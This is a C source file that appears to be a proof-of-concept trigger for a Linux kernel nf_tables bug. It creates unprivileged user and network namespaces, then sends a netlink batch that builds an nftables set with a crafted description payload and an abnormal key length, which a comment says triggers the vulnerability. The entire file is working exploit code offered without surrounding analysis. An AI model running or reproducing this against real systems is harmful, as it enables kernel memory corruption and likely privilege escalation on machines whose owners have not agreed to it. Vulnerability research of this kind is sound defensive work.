#define _GNU_SOURCE
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/set.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stddef.h>
#include <stdlib.h>
void make_payload(char *buf1)
{
    int index = 0;
    buf1[index] = 8;
    index += 2;
    buf1[index] = 1;
    index += 2;
    buf1[index] = 0x00;
    buf1[index + 1] = 0x00;
    buf1[index + 2] = 0x00;
    buf1[index + 3] = 0x00;
    index += 4;
    buf1[index] = 0xf8;
    buf1[index + 1] = 0x3;
    index += 2;
    buf1[index] = 2;
    index += 2;
    for (int i = 0; i < 0x20; i++)
    {
        buf1[index] = 0xc; // len
        index += 2;
        buf1[index] = 0x1; // type
        index += 2;
        buf1[index] = 0x8;
        index += 2;
        buf1[index] = 0x1;
        buf1[index + 5] = 0x30;
        index += 6;
    }
}
int setup_sandbox(void)
{

    if (unshare(CLONE_NEWUSER) < 0)
    {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }

    if (unshare(CLONE_NEWNET) < 0)
    {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(1, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0)
    {
        perror("[-] sched_setaffinity");
        return -1;
    }

    return 0;
}

int main(int argc, char **argv)
{
    setup_sandbox(); // Set the namespace

    struct nftnl_table *table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, "x");
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    int seq = 0;
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    struct nlmsghdr *nlh;
    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                      NFT_MSG_NEWTABLE, NFPROTO_NETDEV,
                                      0, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);
    char buf1[0x900];
    memset(buf1, 0, 0x800);
    make_payload(buf1); // Construction data trigger vulnerability
    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, NFPROTO_NETDEV,
                                    NLM_F_CREATE, seq++);
    mnl_attr_put_strz(nlh, NFTA_SET_TABLE, "x");
    mnl_attr_put_strz(nlh, NFTA_SET_NAME, "y");
    mnl_attr_put_u32(nlh, NFTA_SET_KEY_LEN, 0x04000000);
    mnl_attr_put_u32(nlh, NFTA_SET_ID, 10);
    mnl_attr_put_u32(nlh, NFTA_SET_FLAGS, htonl(0));
    int64_t user_data[0x100];
    user_data[0] = 0x12345678;
    user_data[1] = 0x87654321;
    mnl_attr_put(nlh, NFTA_SET_USERDATA, 0x8, user_data);
    mnl_attr_put(nlh, NFTA_SET_DESC, 0x400, buf1);
    mnl_nlmsg_batch_next(batch);
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER); // Send
    if (nl == NULL)
    {
        err(1, "mnl_socket_open");
    }
    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        err(1, "mnl_socket_send");
    }
    return 0;
}